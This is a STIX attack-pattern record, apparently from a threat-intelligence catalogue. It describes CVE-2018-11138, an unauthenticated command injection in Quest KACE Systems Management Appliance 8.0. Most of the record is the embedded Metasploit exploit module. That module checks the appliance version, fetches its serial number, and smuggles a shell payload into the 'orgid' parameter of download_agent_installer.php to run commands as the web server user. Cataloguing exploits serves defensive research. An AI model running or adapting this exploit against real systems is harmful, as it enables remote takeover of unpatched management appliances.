{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--99b2b88a-d248-4534-8673-2234c347bf26",
    "created": "2024-08-14T17:14:51.137391Z",
    "modified": "2024-08-14T17:14:51.137395Z",
    "name": "Quest KACE Systems Management Command Injection",
    "description": " This module exploits a command injection vulnerability in Quest KACE Systems Management Appliance version 8.0.318 (and possibly prior).  The `download_agent_installer.php` file allows unauthenticated users to execute arbitrary commands as the web server user `www`.  A valid Organization ID is required. The default value is `1`.  A valid Windows agent version number must also be provided. If file sharing is enabled, the agent versions are available within the `\\\\kace.local\\client\\agent_provisioning\\windows_platform` Samba share. Additionally, various agent versions are listed on the KACE website.  This module has been tested successfully on Quest KACE Systems Management Appliance K1000 version 8.0 (Build 8.0.318).  'License'        => MSF_LICENSE 'Privileged'     => false 'Platform'       => 'unix', # FreeBSD 'Arch'           => ARCH_CMD 'DisclosureDate' => '2018-05-31'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/quest_kace_systems_management_rce.rb",
            "external_id": "quest_kace_systems_management_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-11138"
        },
        {
            "source_name": "reference",
            "url": "https://support.quest.com/product-notification/noti-00000134"
        },
        {
            "source_name": "reference",
            "url": "https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Quest KACE Systems Management Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability in Quest KACE\n        Systems Management Appliance version 8.0.318 (and possibly prior).\n\n        The `download_agent_installer.php` file allows unauthenticated users\n        to execute arbitrary commands as the web server user `www`.\n\n        A valid Organization ID is required. The default value is `1`.\n\n        A valid Windows agent version number must also be provided. If file\n        sharing is enabled, the agent versions are available within the\n        `\\\\kace.local\\client\\agent_provisioning\\windows_platform` Samba share.\n        Additionally, various agent versions are listed on the KACE website.\n\n        This module has been tested successfully on Quest KACE Systems\n        Management Appliance K1000 version 8.0 (Build 8.0.318).\n      },\n      'License'        => MSF_LICENSE,\n      'Privileged'     => false,\n      'Platform'       => 'unix', # FreeBSD\n      'Arch'           => ARCH_CMD,\n      'DisclosureDate' => '2018-05-31',\n      'Author'         =>\n        [\n          'Leandro Barragan', # Discovery and PoC\n          'Guido Leo',        # Discovery and PoC\n          'bcoles',    # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2018-11138'],\n          ['URL', 'https://support.quest.com/product-notification/noti-00000134'],\n          ['URL', 'https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => \"\\x00\\x27\",\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl'\n            }\n        },\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0))\n    register_options [\n      OptString.new('SERIAL',        [false, 'Serial number', '']),\n      OptString.new('ORGANIZATION',  [true, 'Organization ID', '1']),\n      OptString.new('AGENT_VERSION', [true, 'Windows agent version', '8.0.152'])\n    ]\n  end\n\n  def check\n    res = send_request_cgi('uri' => normalize_uri('common', 'download_agent_installer.php'))\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 302 && res.headers.to_s.include?('X-KACE-Appliance')\n      vprint_status 'Remote host is not a Quest KACE appliance'\n      return CheckCode::Safe\n    end\n\n    unless res.headers['X-KACE-Version'] =~ /\\A([0-9]+)\\.([0-9]+)\\.([0-9]+)\\z/\n      vprint_error 'Could not determine KACE appliance version'\n      return CheckCode::Detected\n    end\n\n    version = Rex::Version.new res.headers['X-KACE-Version'].to_s\n    vprint_status \"Found KACE appliance version #{version}\"\n\n    # Patched versions : https://support.quest.com/product-notification/noti-00000134\n    if version < Rex::Version.new('7.0') ||\n       (version >= Rex::Version.new('7.0') && version < Rex::Version.new('7.0.121307')) ||\n       (version >= Rex::Version.new('7.1') && version < Rex::Version.new('7.1.150')) ||\n       (version >= Rex::Version.new('7.2') && version < Rex::Version.new('7.2.103')) ||\n       (version >= Rex::Version.new('8.0') && version < Rex::Version.new('8.0.320')) ||\n       (version >= Rex::Version.new('8.1') && version < Rex::Version.new('8.1.108'))\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def serial_number\n    return datastore['SERIAL'] unless datastore['SERIAL'].to_s.eql? ''\n\n    res = send_request_cgi('uri' => normalize_uri('common', 'about.php'))\n    return unless res\n\n    res.body.scan(/Serial Number: ([A-F0-9]+)/).flatten.first\n  end\n\n  def exploit\n    check_code = check\n    unless [CheckCode::Appears, CheckCode::Detected].include? check_code\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    serial = serial_number\n    if serial.to_s.eql? ''\n      print_error 'Could not retrieve appliance serial number. Try specifying a SERIAL.'\n      return\n    end\n    vprint_status \"Using serial number: #{serial}\"\n\n    print_status \"Sending payload (#{payload.encoded.length} bytes)\"\n\n    vars_get = Hash[{\n      'platform' => 'windows',\n      'serv'     => Digest::SHA256.hexdigest(serial),\n      'orgid'    => \"#{datastore['ORGANIZATION']}#; #{payload.encoded} \",\n      'version'  => datastore['AGENT_VERSION']\n    }.to_a.shuffle]\n\n    res = send_request_cgi({\n      'uri'      => normalize_uri('common', 'download_agent_installer.php'),\n      'vars_get' => vars_get\n    }, 10)\n\n    unless res\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    unless res.headers.to_s.include?('KACE') || res.headers.to_s.include?('KBOX')\n      fail_with Failure::UnexpectedReply, 'Unexpected reply'\n    end\n\n    case res.code\n    when 200\n      print_good 'Payload executed successfully'\n    when 404\n      fail_with Failure::BadConfig, 'The specified AGENT_VERSION is not valid for the specified ORGANIZATION'\n    when 302\n      if res.headers['location'].include? 'error.php'\n        fail_with Failure::UnexpectedReply, 'Server encountered an error'\n      end\n      fail_with Failure::BadConfig, 'The specified SERIAL is incorrect'\n    else\n      print_error 'Unexpected reply'\n    end\n\n    register_dir_for_cleanup \"/tmp/agentprov/#{datastore['ORGANIZATION']}#;/\"\n  end\nend\n"
}